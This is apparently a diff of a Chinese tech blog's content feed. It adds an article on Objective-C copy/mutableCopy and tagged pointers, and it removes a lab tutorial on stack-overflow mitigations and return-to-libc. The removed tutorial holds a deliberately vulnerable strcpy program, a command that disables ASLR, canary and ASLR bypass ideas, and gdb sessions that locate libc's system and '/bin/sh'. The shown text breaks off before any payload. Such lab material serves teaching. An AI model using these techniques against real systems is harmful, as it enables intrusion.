+<p>__NSCFConstantString 对象，就是<strong>字符串常量对象，存储在栈上</strong>，创建之后由系统来管理内存释放.相同内容的 NSCFConstantString 对象地址相同。该对象引用计数很大，为固定值不会变化，表示无限运行的 retainCount ，对其进行 retain 或 release 也不会影响其引用计数。</p>
+<p>当创建一个 NSCFConstantString 对象时，会检测这个字符串内容是否已经存在，如果存在，则直接将地址赋值给变量；不存在的话，则创建新地址，再赋值。</p>
+<p>总的来说，<strong>对于 NSCFConstantString 对象，只要字符串内容不变，就不会分配新的内存地址</strong>，无论你是赋值、 retain、 copy 。这种优化在大量使用 NSString 的情况下可以节省内存，提高性能。</p>
+<p>——摘自简书作者路子：<a href="http://www.jianshu.com/p/0e98f37114e3">NSString：内存简述，Copy与Strong关键字</a></p>
+</blockquote>
+<p>对于 NSString 来说，以下几种赋值方法将会保存为 NSCFConstantString 对象：</p>
+<ol>
+<li>直接赋值，如 <code>NSString *str = @&quot;STR&quot;;</code></li>
+<li>stringWithString ,如 <code>NSString *str = [NSString stringWithString:@&quot;Str&quot;];</code></li>
+<li><code>str1 = str2;</code></li>
+<li><code>str1 = [str2 copy/retain];</code></li>
+</ol>
+<p><strong>__NSCFString</strong></p>
+<p>__NSCFString 对象是 <strong>NSString 的一种子类，存储在堆上</strong>，不属于字符串常量对象。该对象创建之后和其他的 Obj 对象一样引用计数为1，对其执行 retain 和 release 将改变其 retainCount 。</p>
+<p>诸如 <code>[NSString stringWithFormat:]</code> 方法以及 <code>NSMutableString</code> 创建的字符串等，都是构造的这种对象。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>mutableCopy</code> 意味着你告诉编译器，我拷贝过来的这个对象可能会改变，因此编译器肯定会新开辟一个地址给你。 因此采用这种方式的都是深拷贝（包括单层深拷贝和完全拷贝）。<br>通过结果我们也可以看见，正如我们前面所提到的，copy 返回不可变对象，因此对于原始对象是不可变的 NSSring 类型，完全没有必要再新分配一块内存。<strong>因此对于不可变的非集合对象，采用 mutableCopy 方式的拷贝就是深拷贝，copy 是浅拷贝。</strong></p>
+<h2 id="非集合类对象-NSMutableString"><a href="#非集合类对象-NSMutableString" class="headerlink" title="非集合类对象(NSMutableString)"></a>非集合类对象(NSMutableString)</h2><h3 id="执行代码：-1"><a href="#执行代码：-1" class="headerlink" title="执行代码："></a>执行代码：</h3><table><tbody><tr><td class="code"><pre><div class="line">fC.mString = [<span class="built_in">NSMutableString</span> stringWithString:<span class="string">@"mStringingi"</span>];</div><div class="line">fC.stringCopy = fC.mString;  <span class="comment">//深，新地址（可变String）</span></div><div class="line">fC.stringMutableCopy = [fC.mString mutableCopy]; <span class="comment">////深，新地址 (可变String)</span></div><div class="line">        </div><div class="line">fC.mStringCopy = [fC.mString <span class="keyword">copy</span>];  <span class="comment">//深，新地址，可变String）</span></div><div class="line">fC.mStringMutableCopy = [fC.mString mutableCopy]; <span class="comment">//深，新地址，(可变String)</span></div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n非集合类对象(NSMutableString)：\noriginal address:    "</span>); AmyLog(fC.mString);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSString:    "</span>); AmyLog(fC.stringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSString:    "</span>); AmyLog(fC.stringMutableCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSMutableString:   "</span>); AmyLog(fC.mStringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSMutableString:    "</span>); AmyLog(fC.mStringMutableCopy);</div></pre></td></tr></tbody></table>
+
+<h3 id="打印结果：-1"><a href="#打印结果：-1" class="headerlink" title="打印结果："></a>打印结果：</h3><p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSMutableString.png"></p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们已经知道只要用 <code>mutableCopy</code> ，对于非集合对象的拷贝，无论可变不可变，都是深拷贝。 <code>copy</code> 对于不可变对象的拷贝是浅拷贝。那么对于 <code>copy</code> 可变对象呢？如上图的结果所示，是深拷贝。</p>
+<p>也很容易理解，我这个对象是可变的，我随时可能通过其他引用它的指针来改变这个对象，现在你要拷贝一份不可变的内容，编译器当然不能直接把它的指针给你啦，这样岂不就是可变的了？所以要新分配给你一块内存，用来储存你拷贝的不可变内容。</p>
+<p>就是说，<strong>对于可变非集合对象的拷贝，copy 和 mutableCopy 都是做的深拷贝。</strong></p>
+<h3 id="NSTaggedPointerString"><a href="#NSTaggedPointerString" class="headerlink" title="__NSTaggedPointerString"></a>__NSTaggedPointerString</h3><p>Tagged Pointer 是一个能够提升性能、节省内存的有趣的技术。我们知道，程序都使用了指针地址对齐概念。指针地址对齐就是指在分配堆中的内存时往往采用偶数倍或以2为指数倍的内存地址作为地址边界。几乎所有系统架构，包括 Mac OS 和 iOS，都使用了地址对齐概念对象。对于 iOS 和 MAC 来说，指针地址是以16个字节（或16的倍数）为对齐边界的，进一步说，分配的内存地址最后4位永远都是0。</p>
+<p>Tagged Pointer 利用了这一现状，它使对象指针中非零位（最后4位）有了特殊的含义。在苹果的64位 Objective-C 实现中，<strong>若对象指针的最低有效位为1(即奇数)，则该指针为 Tagged Pointer 。这种指针不通过解引用 isa 来获取其所属类，</strong>而是通过接下来三位的一个类表的索引。该索引是用来查找所属类是采用 Tagged Pointer 的哪个类。剩下的60位则留给类来使用。</p>
+<p>Tagged Pointer 有一个简单的应用，那就是 NSNumber 。它使用60位来存储数值。最低位置1。剩下3位为 NSNumber 的标志。这样，就可以存储任何所需内存小于60位的数值。</p>
+<blockquote>
+<p>注：以上是在 x86_64 架构中，<strong>在 iOS ARM64 架构中，是最高4位表示所属类，对于最低位，不同类有不同的意义，比如 NSString 代表的是字符长度 length</strong>，NSNumber 我猜测代表的是数字长度类型。</p>
+</blockquote>
+<p>从外部看，Tagged Pointer很像一个对象。它能够响应消息，因为 objc_msgSend 可以识别 Tagged Pointer 。假设你调用 integerValue ，它将从那60位中提取数值并返回。这样，每访问一个对象，就省下了一次真正对象的内存分配，省下了一次间接取值的时间。同时引用计数可以是空指令，因为没有内存需要释放。对于常用的类，这将是一个巨大的性能提升。</p>
+<p>NSString 也是如此。对于那些所需内存小于60位的字符串，它可以创建一个 Tagged Pointer。所需内存大于60位的则放置在真正的 NSString 对象里。这使得常用的短字符串的性能得到明显的提升。</p>
+<p>关于 NSString 中的 Tagged Pointer 编码比较复杂，条件是<strong>长度小于11位，且由 Apple 的代码生成在运行时</strong>，即不是直接定义，而是如上图中 mutableCopy/copy 转换而来，编码详情请见<a href="http://www.cocoachina.com/ios/20150918/13449.html">【译】采用Tagged Pointer的字符串</a></p>
+<blockquote>
+<p>在 WWDC2013 中 APPLE 对于它的特点是这样总结的：</p>
+<ol>
+<li>Tagged Pointer 专门用来存储小的对象，例如 NSNumber 和NSDate</li>
+<li><strong>Tagged Pointer 指针的值不再是地址了，而是真正的值。所以，实际上它不再是一个对象了，它只是一个披着对象皮的普通变量而已。所以，它的内存并不存储在堆中，也不需要 malloc 和 free 。</strong>跟 __NSCFConstantString 一样拥有非常大的 retainCount ，因为压根儿就不在堆上啊。</li>
+<li>在内存读取上有着3倍的效率，创建时比以前快106倍。</li>
+</ol>
+</blockquote>
+<p>对 NSString 对象来说，当非字面量的数字，英文字母字符串的长度小于等于11的时候会自动成为 NSTaggedPointerString 类型（赋值为常量除外），如果有中文或其他特殊符号（可能是非 ASCII 字符）存在的话则会直接成为 __NSCFString 类型。</p>
+<p><strong>Tagged Pointer 举例</strong><br>比如我们将上面的字符串改为<br><code>fC.mString = [NSMutableString stringWithString:@&quot;mStringingin&quot;];</code>，<br>比之前少了1位，只有11位，则输出结果就变为了：</p>
+<p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSMutableString2.png"></p>
+<p>除了拷贝的可变副本（最后一个），其他不可变副本都是 Tagged Pointer ，直接存储的值。</p>
+<h2 id="集合类对象-NSArray"><a href="#集合类对象-NSArray" class="headerlink" title="集合类对象(NSArray)"></a>集合类对象(NSArray)</h2><h3 id="执行代码：-2"><a href="#执行代码：-2" class="headerlink" title="执行代码："></a>执行代码：</h3><table><tbody><tr><td class="code"><pre><div class="line">fC.array = [<span class="built_in">NSArray</span> arrayWithObjects:<span class="string">@"hello"</span>,<span class="string">@"world"</span>,<span class="string">@"baby"</span>, <span class="literal">nil</span>];</div><div class="line">fC.arrayCopy = fC.array;  <span class="comment">//浅，指针</span></div><div class="line">fC.arrayMutableCopy = [fC.array mutableCopy]; <span class="comment">//单层深，新地址</span></div><div class="line">        </div><div class="line">fC.mArrayCopy = [fC.array <span class="keyword">copy</span>]; <span class="comment">//浅，指针</span></div><div class="line">fC.mArrayMutableCopy = [fC.array mutableCopy]; <span class="comment">//单层深，新地址</span></div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n集合类对象(NSArray)：\noriginal address:    "</span>); AmyLog(fC.array); AmyLog([fC.array objectAtIndex:<span class="number">1</span>]);</div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSArray:    "</span>); AmyLog(fC.arrayCopy); AmyLog([fC.arrayCopy objectAtIndex:<span class="number">1</span>]);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSArray:    "</span>); AmyLog(fC.arrayMutableCopy); AmyLog([fC.arrayMutableCopy objectAtIndex:<span class="number">1</span>]);</div><div class="line"></div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSMutableArray:   "</span>); AmyLog(fC.mArrayCopy); AmyLog([fC.mArrayCopy objectAtIndex:<span class="number">1</span>]);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSMutableArray:    "</span>); AmyLog(fC.mArrayMutableCopy); AmyLog([fC.mArrayMutableCopy objectAtIndex:<span class="number">1</span>]);</div></pre></td></tr></tbody></table>
+
+<h3 id="打印结果：-2"><a href="#打印结果：-2" class="headerlink" title="打印结果："></a>打印结果：</h3><p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSArray.png"></p>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>从结果可以发现，对于第一层的指针来说，跟 NSString 是一样的，copy 浅拷贝（复制指针，即指针不变）， mutableCopy 深拷贝（新内存），但是打印数组中的元素，就发现元素的指针并没有变，也就是第二层依然是浅拷贝，因此这就是单层深拷贝了。</p>
+<h3 id="集合的浅拷贝和完全拷贝"><a href="#集合的浅拷贝和完全拷贝" class="headerlink" title="集合的浅拷贝和完全拷贝"></a>集合的浅拷贝和完全拷贝</h3><p>集合的浅拷贝有非常多种方法（上面那种 copy 就是）。当你进行浅拷贝时，会向原始的集合发送retain消息，引用计数加1，同时指针被拷贝到新的集合。</p>
+<p>现在让我们看一些浅拷贝的例子：</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSArray</span> *shallowCopyArray = [someArray copyWithZone:<span class="literal">nil</span>];   </div><div class="line"><span class="built_in">NSSet</span> *shallowCopySet = [<span class="built_in">NSSet</span> mutableCopyWithZone:<span class="literal">nil</span>];   </div><div class="line"><span class="built_in">NSDictionary</span> *shallowCopyDict = [[<span class="built_in">NSDictionary</span> alloc] initWithDictionary:someDictionary copyItems:<span class="literal">NO</span>];</div></pre></td></tr></tbody></table>
+
+<p>那么如何才能对元素也进行深拷贝呢？</p>
+<p>集合的深拷贝有两种方法。可以用 initWithArray:copyItems: 将第二个参数设置为 YES 即可深拷贝，如</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSDictionary</span> shallowCopyDict = [[<span class="built_in">NSDictionary</span> alloc] initWithDictionary:someDictionary copyItems:<span class="literal">YES</span>];</div></pre></td></tr></tbody></table>
+
+<p>如果你用这种方法深拷贝，集合里的每个对象都会收到 copyWithZone: 消息。如果集合里的对象遵循 NSCopying 协议，那么对象就会被深拷贝到新的集合。如果对象没有遵循 NSCopying 协议，而尝试用这种方法进行深拷贝，会在运行时出错。 copyWithZone: 这种拷贝方式只能够提供一层内存拷贝(one-level-deep copy)，而非真正的深拷贝。</p>
+<p>第二个方法是将集合进行归档(archive)，然后解档(unarchive)，如：</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSArray</span> *trueDeepCopyArray = [<span class="built_in">NSKeyedUnarchiver</span> unarchiveObjectWithData:[<span class="built_in">NSKeyedArchiver</span> archivedDataWithRootObject:oldArray]];</div></pre></td></tr></tbody></table>
+
+<p>终于搞定这个了！</p>
+<hr>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] NSString：内存简述，Copy与Strong关键字　<a href="http://www.jianshu.com/p/0e98f37114e3">http://www.jianshu.com/p/0e98f37114e3</a><br>[2] iOS 集合的深复制与浅复制　<a href="https://www.zybuluo.com/MicroCai/note/50592">https://www.zybuluo.com/MicroCai/note/50592</a><br>[3] 深入理解Tagged Pointe　<a href="http://www.infoq.com/cn/articles/deep-understanding-of-tagged-pointer/">http://www.infoq.com/cn/articles/deep-understanding-of-tagged-pointer/</a><br>[4] 【译】采用Tagged Pointer的字符串　<a href="http://www.cocoachina.com/ios/20150918/13449.html">http://www.cocoachina.com/ios/20150918/13449.html</a></p>
+]]></content>
+      <categories>
+        <category>编程语言语法</category>
       </categories>
   </entry>
   <entry>
@@ -1983,176 +2155,6 @@
 ]]></content>
       <categories>
         <category>翻译</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>栈溢出之 ROP（一）</title>
-    <url>/b1689cf9.html</url>
-    <content><![CDATA[<p>栈溢出的基本原理以及shellcode利用可以查看我的上一篇文章——<a href="https://harpersu00.github.io/adec3bdf.html">栈溢出之shellcode</a>。</p>
-<h2 id="栈溢出缓解措施介绍"><a href="#栈溢出缓解措施介绍" class="headerlink" title="栈溢出缓解措施介绍"></a>栈溢出缓解措施介绍</h2><p>栈地址随机化（攻击者不知道shellcode的地址，无法构造return address）：ASLR（地址空间随机化）、PIE（地址无关可执行文件）</p>
-<p>检测栈溢出，并报错退出：Stack Canary/Cookie</p>
-<p>栈不可执行：NX（不执行）/DEP（数据执行保护）</p>
-<a id="more"></a>
-
-<h3 id="ASLR-和-PIE"><a href="#ASLR-和-PIE" class="headerlink" title="ASLR 和 PIE"></a>ASLR 和 PIE</h3><p>ASLR是地址空间随机化。开启后，堆、栈、共享库都会有一个随机偏移，堆和共享库往上（高地址处）偏移一个随机量，栈往下（低地址处）偏移。随机粒度为0x1000，一个内存页的大小。</p>
-<p>单独开启ASLR，虽然堆、栈、共享库都会被随机化，但是程序的入口代码加载还是在固定地址0x804800。</p>
-<p>PIE（地址无关代码）开启后，编译器会在编译时生成地址无关代码，编译选项<code>-fPIC -pie</code>，这样程序就可以在随机地址处被加载。也就是程序的代码以及数据段会往上（高地址处）偏移一个随机量。如下图所示。</p>
-<img src="../images/2019-03-12-栈溢出之-ROP（一）/图1.png" width="800" height="550" align="middle" />
-
-<p>使用<code>ldd</code>命令查看加载库的地址，可以看到两次都不一样。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ldd a.out </span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf77c7000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf75e6000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf77c8000)</span><br><span class="line"><span class="variable">$</span> ldd a.out </span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf7798000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf75b7000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf7799000)</span><br></pre></td></tr></table></figure>
-
-<p>查看程序加载地址：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> gcc test.c <span class="literal">-m32</span> <span class="literal">-fPIC</span> <span class="literal">-pie</span> <span class="literal">-o</span> a2.out</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span> a2.out</span><br><span class="line">Reading symbols from /home/scbox/Documents/a2.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="built_in">disable-randomization</span> off <span class="comment">#如果不开启这个选项，则在gdb中默认是不随机化的</span></span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x5ff</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/a2.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x565855ff <span class="keyword">in</span> main ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">...</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span> a2.out</span><br><span class="line">...</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/a2.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x565e25ff <span class="keyword">in</span> main ()  <span class="comment">#两次main函数的地址不一样了</span></span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>只是开启了ASLR，没有开启PIE的话，可以通过<code>Return to PLT</code>，绕过共享库随机化。（比如将shellcode放置在.data段，这部分是不会随机化的）</li>
-<li>x86_32架构下爆破（因为随机化粒度为0x1000，所以只有几千种可能）</li>
-<li>info leak（信息泄露，比如在我的<a href="https://harpersu00.github.io/7e77e3d1.html">（译）Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656)</a>文章中介绍的CVE-2016-4655漏洞）</li>
-<li>nop sled（在shellcode之前添加大段nop指令，在上一篇<a href="https://harpersu00.github.io/adec3bdf.html">栈溢出之shellcode</a>的文章中，使用了这种方法）</li>
-<li>heap spray（堆喷）</li>
-<li>在本地环境中，可以使用<code>ulimit -s unilimited</code>命令（程序崩溃后会生成core dump文件，可以在这个文件中查看shellcode地址）</li>
-</ul>
-<h3 id="Stack-Canary-Cookie"><a href="#Stack-Canary-Cookie" class="headerlink" title="Stack Canary/Cookie"></a>Stack Canary/Cookie</h3><p>这个机制是用来检测栈溢出的。对于需要保护的函数，在执行之前，将一个随机值放在栈上，这个值被称为Canary。在64位上一般在rbp-0x8的位置，32位在ebp-0x4的位置，也就是ebp保存地址往下（低地址）的部分。然后在函数返回之前，会先检测这个值是否发生改变。stack_chk_fail的错误信息就是由于栈溢出。通过编译选项<code>gcc -fstack-protector</code>可以开启。</p>
-<img src="../images/2019-03-12-栈溢出之-ROP（一）/图2.png" width="650" height="450" align="middle" />
-
-<p>可以通过泄露Canary的方式绕过（同一进程不同线程的函数的Canary是一样的，比如read函数）</p>
-<p>控制覆盖长度（只覆盖局部变量，不覆盖返回地址）</p>
-<p>修改Canary（Canary保存在TLS(Thread-local Storage)寄存器中，一般是偏移0x14的位置stack_guard）</p>
-<p>劫持stack_chk_fail（canary被覆盖时，就会调用这个函数，劫持后可跳转到自己的shellcode，比如<a href="https://harpersu00.github.io/1e59798b.html">GOT表劫持</a>）</p>
-<p>利用stack_chk_fail的报错信息（在报错信息中，会打印栈溢出的程序名，即argv[0]，可以覆盖这个地址为其他地址，输出我们想知道的内容）</p>
-<h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX/DEP"></a>NX/DEP</h3><p>栈不可执行主要是对程序的内存块权限进行更进一步的划分。堆、栈以及数据区可写，但不可执行。代码区、只读数据区不可写，但可执行。也就是说我们要找一块内存区域是既可写也可以执行的，来写入shellcode，是找不到了。</p>
-<p>绕过NX/DEP所需要的方法有一个基本思想，就是Return to Libc。因为我们不能执行写入的代码，那我们就跳转到程序已经加载了的代码中执行，比如libc中的大量函数，system()等等。</p>
-<p><img src="/images/2019-03-12-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B-ROP%EF%BC%88%E4%B8%80%EF%BC%89/%E5%9B%BE3.png"></p>
-<p>如上图所示，我们将函数的return地址覆盖为libc中的system函数地址，当进程跳转到这个地址时，会执行system函数内部的指令，首先是所有函数都有的，<code>push ebp;</code> 跟<code> mov ebp, esp;</code>这两条指令，即将<code>exit</code>的地址push到。需要读取栈上的参数，即”/bin/sh”，</p>
-<h2 id="Return-to-libc"><a href="#Return-to-libc" class="headerlink" title="Return to libc"></a>Return to libc</h2><p>shellcode以及含有栈溢出漏洞的代码都采用的是跟我上一篇文章一样的代码。</p>
-<p>含有栈溢出漏洞的代码:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please input one argument!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;argv[1]: %s\n&quot;</span>, buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译命令<code>gcc test.c -m32</code></p>
-<p>需要关闭ASLR:<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
-<p>跟前文不同的是，由于没有关闭NP/DEP，所以栈上的shellcode是无法执行的，所以我们要用已经加载的库中的函数来执行我们想要的代码。</p>
-<p>首先，使用gdb查看system以及exit函数地址，在libc中查找字符串<code>&quot;/bin/sh&quot;</code>地址：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> gdb ./a.out </span><br><span class="line">......</span><br><span class="line">Reading symbols from /home/scbox/Documents/a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x8048470</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/./a.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x08048470 <span class="keyword">in</span> main ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">(gdb) p system <span class="comment">#打印system()函数的地址</span></span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0</span>xf7e36f70 &lt;system&gt;</span><br><span class="line">(gdb) p <span class="keyword">exit</span> <span class="comment">#打印exit()函数的地址</span></span><br><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0</span>xf7e2a7a0 &lt;<span class="keyword">exit</span>&gt;</span><br><span class="line">(gdb) info proc mappings</span><br><span class="line"><span class="keyword">process</span> <span class="number">97414</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Start</span> Addr   <span class="keyword">End</span> Addr       Size     Offset objfile</span><br><span class="line">......</span><br><span class="line">	<span class="number">0</span>xf7df7000 <span class="number">0</span>xf7df8000     <span class="number">0</span>x1000        <span class="number">0</span>x0 </span><br><span class="line">	<span class="number">0</span>xf7df8000 <span class="number">0</span>xf7fbc000   <span class="number">0</span>x1c4000        <span class="number">0</span>x0 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so <span class="comment">#起始地址</span></span><br><span class="line">	<span class="number">0</span>xf7fbc000 <span class="number">0</span>xf7fbd000     <span class="number">0</span>x1000   <span class="number">0</span>x1c4000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so</span><br><span class="line">	<span class="number">0</span>xf7fbd000 <span class="number">0</span>xf7fbf000     <span class="number">0</span>x2000   <span class="number">0</span>x1c4000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so</span><br><span class="line">	<span class="number">0</span>xf7fbf000 <span class="number">0</span>xf7fc0000     <span class="number">0</span>x1000   <span class="number">0</span>x1c6000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so <span class="comment">#结束地址</span></span><br><span class="line">	<span class="number">0</span>xf7fc0000 <span class="number">0</span>xf7fc3000     <span class="number">0</span>x3000        <span class="number">0</span>x0 </span><br><span class="line">......</span><br><span class="line">	<span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000    <span class="number">0</span>x21000        <span class="number">0</span>x0 [<span class="type">stack</span>]</span><br><span class="line">(gdb) find /b <span class="number">0</span>xf7df8000, <span class="number">0</span>xf7fc0000, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="number">0</span> <span class="comment">#查找字符串</span></span><br><span class="line"><span class="number">0</span>xf7f78015</span><br><span class="line"><span class="number">1</span> pattern found.</span><br><span class="line">(gdb) x/s <span class="number">0</span>xf7f78015</span><br><span class="line"><span class="number">0</span>xf7f78015:	<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>这一步，也可以使用<code>reaelf</code> <code>strings</code>等命令查看system、exit函数地址，以及/bin/sh字符串地址：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ldd a.out <span class="comment">#查看libc库起始地址</span></span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf7fd9000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf7df8000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf7fda000)</span><br><span class="line"><span class="variable">$</span> readelf <span class="literal">-s</span> /lib/libc.so.<span class="number">6</span> | grep system<span class="selector-tag">@</span>  <span class="comment">#在libc库中查找system偏移地址</span></span><br><span class="line">   <span class="number">627</span>: <span class="number">0003</span>ef70    <span class="number">98</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __libc_system<span class="selector-tag">@</span>@GLIBC_PRIVATE</span><br><span class="line">  <span class="number">1454</span>: <span class="number">0003</span>ef70    <span class="number">98</span> FUNC    WEAK   DEFAULT   <span class="number">13</span> system<span class="selector-tag">@</span>@GLIBC_2.<span class="number">0</span></span><br><span class="line"><span class="variable">$</span> readelf <span class="literal">-s</span> /lib/libc.so.<span class="number">6</span> | grep <span class="keyword">exit</span><span class="selector-tag">@</span>  <span class="comment">#在libc库中查找exit偏移地址</span></span><br><span class="line">   <span class="number">113</span>: <span class="number">00032</span>c70    <span class="number">58</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __cxa_at_quick_exit<span class="selector-tag">@</span>@GLIBC_2.<span class="number">10</span></span><br><span class="line">   <span class="number">141</span>: <span class="number">000327</span>a0    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> <span class="keyword">exit</span><span class="selector-tag">@</span>@GLIBC_2.<span class="number">0</span></span><br><span class="line">   ......</span><br><span class="line"><span class="variable">$</span> strings <span class="literal">-tx</span> /lib/libc.so.<span class="number">6</span> | grep /bin/sh  <span class="comment">#在libc库中查找字符串偏移地址</span></span><br><span class="line"> <span class="number">180015</span> /bin/sh</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span>   <span class="comment">#在gdb中计算地址</span></span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x0003ef70 <span class="comment">#起始地址+偏移地址</span></span><br><span class="line"><span 